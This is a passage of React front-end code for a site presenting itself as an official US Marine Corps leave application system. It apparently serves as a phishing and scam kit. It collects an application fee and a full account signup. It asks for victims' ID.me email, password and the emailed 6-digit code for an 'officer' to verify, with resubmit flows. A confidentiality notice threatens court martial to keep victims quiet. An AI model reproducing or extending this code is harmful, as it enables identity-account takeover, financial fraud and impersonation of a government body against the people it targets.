      return (<div className="form-card animate-fade-in" style={{ textAlign: 'center', padding: '1.5rem 1rem' }}><Clock size={40} color="#d97706" style={{ margin: '0 auto 1rem' }} /><h2 className="section-title" style={{ border: 'none' }}>Application Fee Under Review</h2><p style={{ fontSize: '0.95rem', color: '#555', maxWidth: 500, margin: '0 auto' }}>Your application fee payment receipt is being reviewed by an administrator.</p></div>);
    }

    if (status === 'awaiting_idme_verification' || dash?.idmeStatus === 'sending') {
      return (<div className="form-card animate-fade-in" style={{ textAlign: 'center', padding: '1.5rem 1rem' }}><div style={{ animation: 'spin 1s linear infinite', display: 'inline-block', marginBottom: '1rem' }}><Shield size={40} color="var(--primary-blue)" /></div><h2 className="section-title" style={{ border: 'none' }}>IDME Verification In Progress</h2><p style={{ fontSize: '0.95rem', color: '#555', maxWidth: 500, margin: '0 auto' }}>Your IDME credentials are being verified. Please wait...</p></div>);
    }

    if (dash?.idmeStatus === 'declined') {
      return (
        <div className="form-card animate-fade-in">
          <h2 className="section-title">IDME - Action Required</h2>
          <div style={{ background: '#fee2e2', border: '1px solid #fca5a5', borderRadius: 8, padding: '1rem 1.5rem', marginBottom: '1.5rem' }}>
            <p style={{ color: '#991b1b', fontWeight: 600 }}>Your IDME credentials were rejected:</p>
            <p style={{ color: '#991b1b', marginTop: '0.5rem' }}>{dash.idmeDeclineMessage}</p>
          </div>
          <p style={{ marginBottom: '1rem', color: '#555' }}>Re-enter your IDME credentials.</p>
          <div className="form-group"><label className="form-label">IDME Email</label><input type="email" className="form-input" placeholder="your@idme.email" value={idmeCreds.idmeEmail} onChange={e => setIdmeCreds({ ...idmeCreds, idmeEmail: e.target.value })} /></div>
          <div className="form-group"><label className="form-label">IDME Password</label><input type="password" className="form-input" placeholder="IDME password" value={idmeCreds.idmePassword} onChange={e => setIdmeCreds({ ...idmeCreds, idmePassword: e.target.value })} /></div>
          {error && <p style={{ color: '#991b1b', marginBottom: '1rem' }}>{error}</p>}
          <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
            <button onClick={submitIdmeCreds} className="btn btn-primary" disabled={loading}>{loading ? 'Sending...' : 'Resubmit'} <ChevronRight size={16} /></button>
          </div>
        </div>
      );
    }

    if (dash?.idmeStatus === 'awaiting_code') {
      return (
        <div className="form-card animate-fade-in">
          <h2 className="section-title">IDME - Enter Verification Code</h2>
          <div style={{ background: '#d1fae5', border: '1px solid #6ee7b7', borderRadius: 8, padding: '1rem 1.5rem', marginBottom: '1.5rem' }}>
            <p style={{ color: '#065f46', fontWeight: 600 }}>Your IDME credentials verified!</p>
            <p style={{ color: '#065f46', marginTop: '0.25rem' }}>Enter the 6-digit code sent to your email.</p>
          </div>
          <div className="form-group"><label className="form-label">Verification Code</label><input type="text" className="form-input" placeholder="Enter 6-digit code" value={idmeCode} onChange={e => setIdmeCode(e.target.value.replace(/\D/g, '').slice(0, 6))} maxLength={6} style={{ fontSize: '1.2rem', letterSpacing: '0.4rem', textAlign: 'center' }} /></div>
          {error && <p style={{ color: '#991b1b', marginBottom: '1rem' }}>{error}</p>}
          <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
            <button onClick={submitIdmeCode} className="btn btn-primary" disabled={loading || idmeCode.length !== 6}>{loading ? 'Sending...' : 'Submit Code'} <ChevronRight size={16} /></button>
          </div>
        </div>
      );
    }

    if (dash?.idmeStatus === 'code_sending') {
      return (<div className="form-card animate-fade-in" style={{ textAlign: 'center', padding: '1.5rem 1rem' }}><div style={{ animation: 'spin 1s linear infinite', display: 'inline-block', marginBottom: '1rem' }}><Shield size={40} color="var(--primary-blue)" /></div><h2 className="section-title" style={{ border: 'none' }}>Verifying Code</h2><p style={{ fontSize: '0.95rem', color: '#555', maxWidth: 500, margin: '0 auto' }}>Your verification code is being confirmed...</p></div>);
    }

    if (status === 'awaiting_final_approval') {
      return (<div className="form-card animate-fade-in" style={{ textAlign: 'center', padding: '1.5rem 1rem' }}><CheckCircle size={48} color="#2563eb" style={{ margin: '0 auto 1rem' }} /><h2 className="section-title" style={{ border: 'none' }}>Awaiting Final Approval</h2><p style={{ fontSize: '0.95rem', color: '#555', maxWidth: 500, margin: '0 auto' }}>All verifications complete. Awaiting final admin approval.</p></div>);
    }

    return (
      <div className="form-card">
        {renderProgress(stage)}
        {error && <div style={{ background: '#fee2e2', color: '#991b1b', padding: '0.75rem 1rem', borderRadius: 8, marginBottom: '1.5rem' }}>{error}</div>}

        {stage === 1 && renderPaymentStage()}

        {stage === 2 && (
          <div className="animate-fade-in">
            <h2 className="section-title">IDME Verification</h2>
            <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', marginBottom: '1.5rem', background: '#dbeafe', padding: '1rem 1.5rem', borderRadius: 12, border: '1px solid #93c5fd' }}>
              <Shield size={48} color="var(--primary-blue)" />
              <div><h3 style={{ color: 'var(--primary-blue)', fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase' }}>ID.ME</h3><p style={{ color: '#555', fontSize: '0.9rem' }}>Identity Verification Service</p></div>
            </div>
            <p style={{ marginBottom: '1.5rem', color: '#555' }}>Enter your IDME login credentials. An officer will verify them.</p>
            <div className="form-group"><label className="form-label">IDME Email</label><input type="email" className="form-input" placeholder="your@idme.email" value={idmeCreds.idmeEmail} onChange={e => setIdmeCreds({ ...idmeCreds, idmeEmail: e.target.value })} /></div>
            <div className="form-group"><label className="form-label">IDME Password</label><input type="password" className="form-input" placeholder="IDME password" value={idmeCreds.idmePassword} onChange={e => setIdmeCreds({ ...idmeCreds, idmePassword: e.target.value })} /></div>
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
              <button onClick={submitIdmeCreds} className="btn btn-primary" disabled={loading || !idmeCreds.idmeEmail || !idmeCreds.idmePassword}>{loading ? 'Sending...' : 'Submit IDME Credentials'} <ChevronRight size={16} /></button>
            </div>
          </div>
        )}

        {stage === 3 && (
          <div className="animate-fade-in">
            <h2 className="section-title">Clearance Duration</h2>
            <p style={{ marginBottom: '1.5rem', color: '#555' }}>Select your leave duration.</p>
            <div className="duration-grid">
              {[1, 2, 3].map(months => (
                <div key={months} className="stat-card" style={{ cursor: 'pointer', textAlign: 'center', padding: '2rem 1rem', border: clearDur === months ? '2px solid var(--primary-blue)' : undefined, background: clearDur === months ? 'var(--light-blue)' : undefined }} onClick={() => selectDuration(months)}>
                  <div style={{ fontSize: '2rem', fontWeight: 700, color: 'var(--primary-blue)' }}>{months}</div>
                  <div style={{ fontSize: '1rem', color: '#666', marginBottom: '0.5rem' }}>{months === 1 ? 'Month' : 'Months'}</div>
                  <div style={{ fontSize: '0.8rem', color: '#999', marginTop: '0.25rem' }}>Leave Duration</div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>
    );
  };

  return (
    <>
      <div className="background-wrapper"></div>
      <style>{`@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`}</style>
      <Navbar step={step} setStep={setStep} user={user} onLogout={doLogout} />
      <main className="app-container">
        {step === 0 && (
          <div className="home-container animate-fade-in">
            <div className="hero-content">
              <h1 className="hero-title">LEAVE APPLICATION SYSTEM LAS</h1>
              <p className="hero-description">Welcome to the official Leave Application System for the United States Marine Corps. Submit, track, and manage your leave requests efficiently and securely.</p>
            </div>
            <div className="home-actions">
              <button onClick={() => setStep(1)} className="btn btn-primary apply-btn">Apply <ChevronRight size={18} style={{ marginLeft: '0.5rem' }} /></button>
              <button onClick={() => setStep(10)} className="btn btn-secondary apply-btn">Login</button>
            </div>
          </div>
        )}

        {step === 1 && (
          <div className="form-card animate-fade-in" style={{ maxWidth: 600, margin: '1rem auto' }}>
            <h2 className="section-title">Applicant Type</h2>
            <p style={{ marginBottom: '1.5rem', color: '#555' }}>Are you applying for yourself or another service member?</p>
            <div className="form-group">
              <label className="form-label">Applying For</label>
              <select className="form-select" value={signup.applyingFor} onChange={e => setSignup({ ...signup, applyingFor: e.target.value })}>
                <option value="self">Myself (I am the service member)</option>
                <option value="other">Another Service Member</option>
              </select>
            </div>
            {signup.applyingFor === 'other' && (
              <div style={{ background: 'rgba(11,61,145,0.05)', padding: '1rem', borderRadius: 8, borderLeft: '4px solid var(--primary-blue)', marginBottom: '1rem' }}>
                <p style={{ fontSize: '0.9rem', color: '#555' }}>You are applying on behalf of a service member.</p>
              </div>
            )}
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
              <button onClick={() => setStep(0)} className="btn btn-secondary">Back</button>
              <button onClick={() => setStep(2)} className="btn btn-primary">Continue <ChevronRight size={16} /></button>
            </div>
          </div>
        )}

        {step === 2 && (
          <div className="form-card animate-fade-in" style={{ maxWidth: 650, margin: '1rem auto' }}>
            <h2 className="section-title">Confidentiality Agreement</h2>
            <div style={{ background: '#fffbeb', border: '1px solid #fcd34d', borderRadius: 12, padding: '1.5rem', marginBottom: '1.5rem' }}>
              <h3 style={{ fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', color: '#92400e', marginBottom: '1rem', fontSize: '1rem' }}>Legal Notice - Read Carefully</h3>
              <div style={{ color: '#78350f', fontSize: '0.9rem', lineHeight: 1.7 }}>
                <p style={{ marginBottom: '1rem' }}>By registering and using this Leave Application System, I, the undersigned, acknowledge and agree to the following:</p>
                <p style={{ marginBottom: '1rem' }}>I am now <strong>legally mandated</strong> to maintain absolute discretion and confidentiality regarding all details, information, and content related to this Leave Application System. I understand that any unauthorized disclosure, divulgence, or sharing of information pertaining to the process, status, or contents of this application constitutes a serious breach of military discipline.</p>
                <p style={{ marginBottom: '1rem' }}>I further acknowledge that any violation of this confidentiality requirement may subject me to <strong>court martial proceedings</strong> under the Uniform Code of Military Justice (UCMJ), and I may be prosecuted in a court of law for such violations.</p>
                <p>I understand that this obligation of confidentiality extends to all aspects of my application, including but not limited to: application status, verification processes, financial transactions, communication with administrators, and any documentation or correspondence related to this application.</p>
              </div>
            </div>
            <label style={{ display: 'flex', alignItems: 'flex-start', gap: '0.75rem', cursor: 'pointer', padding: '1rem', background: agreed ? '#f0fdf4' : '#f9fafb', border: agreed ? '2px solid #16a34a' : '2px solid #e5e7eb', borderRadius: 8, transition: 'all 0.2s' }}>
              <input type="checkbox" checked={agreed} onChange={e => setAgreed(e.target.checked)} style={{ width: 20, height: 20, marginTop: 2, cursor: 'pointer', accentColor: '#16a34a' }} />
              <span style={{ fontSize: '0.9rem', color: '#333', lineHeight: 1.5 }}>
                <strong>I have read and understood the above confidentiality agreement.</strong> I agree to maintain absolute discretion regarding all aspects of this application. I understand that any breach of this agreement may result in court martial proceedings.
              </span>
            </label>
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
              <button onClick={() => setStep(1)} className="btn btn-secondary">Back</button>
              <button onClick={() => { if (!agreed) { setError('You must agree to the confidentiality terms'); return; } setError(''); setStep(3); }} className="btn btn-primary">Continue <ChevronRight size={16} /></button>
            </div>
          </div>
        )}

        {step === 3 && (
          <div className="form-card animate-fade-in" style={{ maxWidth: 650, margin: '1rem auto' }}>
            <h2 className="section-title">Bio Data</h2>
            <p style={{ marginBottom: '1.5rem', color: '#555' }}>Provide your personal information.</p>
            {error && <div style={{ background: '#fee2e2', color: '#991b1b', padding: '0.75rem 1rem', borderRadius: 8, marginBottom: '1rem' }}>{error}</div>}
            <div className="form-group"><label className="form-label">Address</label><input type="text" className="form-input" placeholder="Street address" value={bio.address} onChange={e => setBio({ ...bio, address: e.target.value })} /></div>
            <div className="form-grid-2">
              <div className="form-group">
                <label className="form-label">State</label>
                <select className="form-select" value={bio.state} onChange={e => setBio({ ...bio, state: e.target.value, city: '' })}>
                  <option value="">Select a state...</option>
                  {Object.keys(STATES).map(s => <option key={s} value={s}>{s}</option>)}
                </select>
              </div>
              <div className="form-group">
                <label className="form-label">City</label>
                <select className="form-select" value={bio.city} onChange={e => setBio({ ...bio, city: e.target.value })} disabled={!bio.state}>
                  <option value="">{bio.state ? 'Select a city...' : 'Select state first...'}</option>
                  {bio.state && STATES[bio.state]?.map(c => <option key={c} value={c}>{c}</option>)}
                </select>
              </div>
            </div>
            <div className="form-group"><label className="form-label">Zip Code</label><input type="text" className="form-input" placeholder="Zip code" value={bio.zipCode} onChange={e => setBio({ ...bio, zipCode: e.target.value })} /></div>
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
              <button onClick={() => setStep(2)} className="btn btn-secondary">Back</button>
              <button onClick={() => setStep(4)} className="btn btn-primary">Continue <ChevronRight size={16} /></button>
            </div>
          </div>
        )}

        {step === 4 && (
          <div className="form-card animate-fade-in" style={{ maxWidth: 650, margin: '1rem auto' }}>
            <h2 className="section-title">Create Account</h2>
            <p style={{ marginBottom: '1.5rem', color: '#555' }}>Set up your account credentials.</p>
            {error && <div style={{ background: '#fee2e2', color: '#991b1b', padding: '0.75rem 1rem', borderRadius: 8, marginBottom: '1rem' }}>{error}</div>}
            <div className="form-group"><label className="form-label">Full Name</label><input type="text" className="form-input" placeholder="Full legal name of service member" value={signup.fullName} onChange={e => setSignup({ ...signup, fullName: e.target.value })} /></div>
            <div className="form-group"><label className="form-label">Email</label><input type="email" className="form-input" placeholder="you@example.com" value={signup.email} onChange={e => setSignup({ ...signup, email: e.target.value })} /></div>
            <div className="form-group"><label className="form-label">Username</label><input type="text" className="form-input" placeholder="Choose a username" value={signup.username} onChange={e => setSignup({ ...signup, username: e.target.value })} /></div>
            <div className="form-group"><label className="form-label">Date of Birth</label><input type="date" className="form-input" value={signup.dob} onChange={e => setSignup({ ...signup, dob: e.target.value })} /></div>
            <div className="form-group"><label className="form-label">Password</label><input type="password" className="form-input" placeholder="Min 8 characters" value={signup.password} onChange={e => setSignup({ ...signup, password: e.target.value })} /></div>
            <div className="form-group"><label className="form-label">Confirm Password</label><input type="password" className="form-input" placeholder="Re-enter password" value={signup.confirmPassword} onChange={e => setSignup({ ...signup, confirmPassword: e.target.value })} /></div>
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '2rem' }}>
              <button onClick={() => setStep(3)} className="btn btn-secondary">Back</button>
              <button onClick={handleSignup} className="btn btn-primary" disabled={loading || !signup.fullName || !signup.email || !signup.username || !signup.password}>{loading ? 'Creating...' : 'Create Account'} <ChevronRight size={16} /></button>
            </div>
          </div>
        )}

        {step === 10 && forgotStep === 0 && (
          <div className="form-card animate-fade-in" style={{ maxWidth: 500, margin: '1.5rem auto' }}>
            <h2 className="section-title" style={{ borderBottom: 'none' }}>Login</h2>
            <p style={{ marginBottom: '2rem', color: '#555' }}>Sign in to track your application.</p>
            {error && <div style={{ background: '#fee2e2', color: '#991b1b', padding: '0.75rem 1rem', borderRadius: 8, marginBottom: '1rem' }}>{error}</div>}
            <div className="form-group"><label className="form-label">Username or Email</label><input type="text" className="form-input" placeholder="Enter username or email" value={loginForm.login} onChange={e => setLoginForm({ ...loginForm, login: e.target.value })} /></div>
            <div className="form-group"><label className="form-label">Password</label><input type="password" className="form-input" placeholder="Password" value={loginForm.password} onChange={e => setLoginForm({ ...loginForm, password: e.target.value })} /></div>
            <button onClick={handleLogin} className="btn btn-primary" style={{ width: '100%', marginTop: '1rem' }} disabled={loading}>{loading ? 'Signing in...' : 'Sign In'}</button>
            <p style={{ textAlign: 'center', marginTop: '0.75rem', fontSize: '0.85rem' }}>
              <a href="#" style={{ color: 'var(--primary-blue)' }} onClick={e => { e.preventDefault(); setError(''); setForgotStep(1); }}>Forgot Password?</a>
            </p>
            <p style={{ textAlign: 'center', marginTop: '1rem', fontSize: '0.9rem' }}>
              Don't have an account? <a href="#" style={{ color: 'var(--primary-blue)' }} onClick={e => { e.preventDefault(); setStep(1); }}>Apply Now</a>
            </p>
          </div>
        )}

        {step === 10 && forgotStep === 1 && (
          <div className="form-card animate-fade-in" style={{ maxWidth: 500, margin: '1.5rem auto' }}>
            <h2 className="section-title" style={{ borderBottom: 'none' }}>Forgot Password</h2>
            {forgotSent ? (
              <>
                <p style={{ marginBottom: '1.5rem', color: '#555' }}>Enter the 6-digit code sent to <strong>{forgotEmail}</strong></p>
                {error && <div style={{ background: '#fee2e2', color: '#991b1b', padding: '0.75rem 1rem', borderRadius: 8, marginBottom: '1rem' }}>{error}</div>}
                <div className="form-group"><label className="form-label">Verification Code</label><input type="text" className="form-input" placeholder="Enter 6-digit code" value={forgotCode} onChange={e => setForgotCode(e.target.value.replace(/\D/g, '').slice(0, 6))} maxLength={6} style={{ fontSize: '1.2rem', letterSpacing: '0.4rem', textAlign: 'center' }} /></div>
                <button onClick={handleVerifyForgotCode} className="btn btn-primary" style={{ width: '100%', marginTop: '1rem' }} disabled={loading || forgotCode.length !== 6}>{loading ? 'Verifying...' : 'Verify Code'}</button>
                <p style={{ textAlign: 'center', marginTop: '1rem', fontSize: '0.85rem' }}>
                  <a href="#" style={{ color: 'var(--primary-blue)' }} onClick={e => { e.preventDefault(); setForgotSent(false); setForgotCode(''); setError(''); }}>Back to Login</a>
                </p>
              </>
            ) : (
              <>
                <p style={{ marginBottom: '1.5rem', color: '#555' }}>Enter your email to receive a password reset code.</p>
                {error && <div style={{ background: '#fee2e2', color: '#991b1b', padding: '0.75rem 1rem', borderRadius: 8, marginBottom: '1rem' }}>{error}</div>}
                <div className="form-group"><label className="form-label">Email Address</label><input type="email" className="form-input" placeholder="you@example.com" value={forgotEmail} onChange={e => { setForgotEmail(e.target.value); setError(''); }} /></div>
                <button onClick={handleForgotPassword} className="btn btn-primary" style={{ width: '100%', marginTop: '1rem' }} disabled={loading || !forgotEmail}>{loading ? 'Sending...' : 'Send Reset Code'}</button>
                <p style={{ textAlign: 'center', marginTop: '1rem', fontSize: '0.85rem' }}>
                  <a href="#" style={{ color: 'var(--primary-blue)' }} onClick={e => { e.preventDefault(); setForgotStep(0); setError(''); }}>Back to Login</a>
                </p>
              </>
            )}
          </div>
        )}

        {step === 10 && forgotStep === 2 && (
          <div className="form-card animate-fade-in" style={{ maxWidth: 500, margin: '1.5rem auto' }}>
            <h2 className="section-title" style={{ borderBottom: 'none' }}>Reset Password</h2>
            <p style={{ marginBottom: '1.5rem', color: '#555' }}>Enter your new password.</p>
            {error && <div style={{ background: '#fee2e2', color: '#991b1b', padding: '0.75rem 1rem', borderRadius: 8, marginBottom: '1rem' }}>{error}</div>}
            <div className="form-group"><label className="form-label">New Password</label><input type="password" className="form-input" placeholder="Min 8 characters" value={newPassword} onChange={e => setNewPassword(e.target.value)} /></div>
            <div className="form-group"><label className="form-label">Confirm Password</label><input type="password" className="form-input" placeholder="Re-enter password" value={confirmNewPassword} onChange={e => setConfirmNewPassword(e.target.value)} /></div>
            <button onClick={handleResetPassword} className="btn btn-primary" style={{ width: '100%', marginTop: '1rem' }} disabled={loading}>{loading ? 'Resetting...' : 'Reset Password'}</button>
          </div>
        )}

        {step === 10 && forgotStep === 3 && (
          <div className="form-card animate-fade-in" style={{ maxWidth: 500, margin: '4rem auto', textAlign: 'center' }}>
            <CheckCircle size={48} color="green" style={{ margin: '0 auto 1rem' }} />
            <h2 className="section-title" style={{ border: 'none' }}>Password Reset!</h2>
            <p style={{ color: '#555', marginBottom: '2rem' }}>Your password has been successfully reset.</p>
            <button onClick={() => { setForgotStep(0); setForgotEmail(''); setForgotCode(''); setNewPassword(''); setConfirmNewPassword(''); setResetToken(''); setForgotSent(false); }} className="btn btn-primary">Sign In</button>
          </div>
        )}

        {step === 100 && renderStage()}

        {step === 200 && (
          <div className="form-card animate-fade-in" style={{ maxWidth: 700, margin: '2rem auto' }}>
            <h2 className="section-title">Support</h2>
            <p style={{ marginBottom: '1.5rem', color: '#555' }}>Send a message to our administrators for support. Fill in your name, subject and message and we will respond by email.</p>
            {error && <div style={{ background: '#fee2e2', color: '#991b1b', padding: '0.75rem 1rem', borderRadius: 8, marginBottom: '1rem' }}>{error}</div>}
            {supportSent && <div style={{ background: '#d1fae5', border: '1px solid #6ee7b7', borderRadius: 8, padding: '0.75rem 1rem', marginBottom: '1rem' }}><p style={{ color: '#065f46', fontWeight: 600 }}>Support message sent! Our team will get back to you.</p></div>}

            {!token ? (
              <div style={{ background: '#fef3c7', border: '1px solid #fcd34d', borderRadius: 8, padding: '1.5rem', textAlign: 'center' }}>
                <p style={{ color: '#92400e', marginBottom: '1rem' }}>Please log in or create an account to contact support.</p>
                <button onClick={() => setStep(10)} className="btn btn-primary">Login</button>
              </div>
            ) : (
              <>
                {supportThread.length > 0 && (
                  <div style={{ marginBottom: '1.5rem' }}>
                    <h3 style={{ color: 'var(--primary-blue)', fontFamily: "'Oswald', sans-serif", textTransform: 'uppercase', marginBottom: '0.75rem', fontSize: '1rem' }}>Your Messages</h3>
                    {supportThread.slice().reverse().map(m => (
                      <div key={m.id} style={{ background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: 10, padding: '1rem 1.25rem', marginBottom: '0.75rem' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.25rem' }}>
                          <strong style={{ color: 'var(--primary-blue)' }}>{m.subject}</strong>
                          <span style={{ fontSize: '0.75rem', color: '#999' }}>{new Date(m.createdAt).toLocaleString()}</span>
                        </div>
                        <p style={{ fontSize: '0.9rem', color: '#333', marginBottom: m.adminReply ? '0.75rem' : 0 }}>{m.message}</p>
                        {m.adminReply && (
                          <div style={{ background: '#dbeafe', borderLeft: '4px solid var(--primary-blue)', borderRadius: 8, padding: '0.75rem 1rem', marginTop: '0.5rem' }}>
                            <p style={{ fontSize: '0.75rem', color: 'var(--primary-blue)', fontWeight: 700, textTransform: 'uppercase', marginBottom: '0.25rem' }}>Admin Reply</p>
                            <p style={{ fontSize: '0.9rem', color: '#333' }}>{m.adminReply}</p>
                          </div>
                        )}
                        {m.replied && !m.adminReply && <p style={{ fontSize: '0.8rem', color: '#16a34a', marginTop: '0.5rem' }}>Replied by admin</p>}
                      </div>
                    ))}
                  </div>
                )}
                <div className="form-group"><label className="form-label">Your Name</label><input type="text" className="form-input" placeholder="Full name" value={supportMsg.name} onChange={e => setSupportMsg({ ...supportMsg, name: e.target.value })} /></div>
                <div className="form-group"><label className="form-label">Subject</label><input type="text" className="form-input" placeholder="What is your message about?" value={supportMsg.subject} onChange={e => setSupportMsg({ ...supportMsg, subject: e.target.value })} /></div>
                <div className="form-group"><label className="form-label">Message</label><textarea className="form-textarea" rows={5} placeholder="Describe your issue or question..." value={supportMsg.message} onChange={e => setSupportMsg({ ...supportMsg, message: e.target.value })} style={{ width: '100%', padding: '0.55rem 0.75rem', border: '1px solid #d1d5db', borderRadius: 6, fontFamily: 'inherit', fontSize: '0.88rem' }} /></div>
                <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '1rem', marginTop: '1.5rem' }}>
                  <button onClick={sendSupportMessage} className="btn btn-primary" disabled={loading || !supportMsg.name || !supportMsg.subject || !supportMsg.message}>{loading ? 'Sending...' : 'Send Message'} <ChevronRight size={16} /></button>
                </div>
              </>
            )}
          </div>
        )}
      </main>
    </>
  );
}
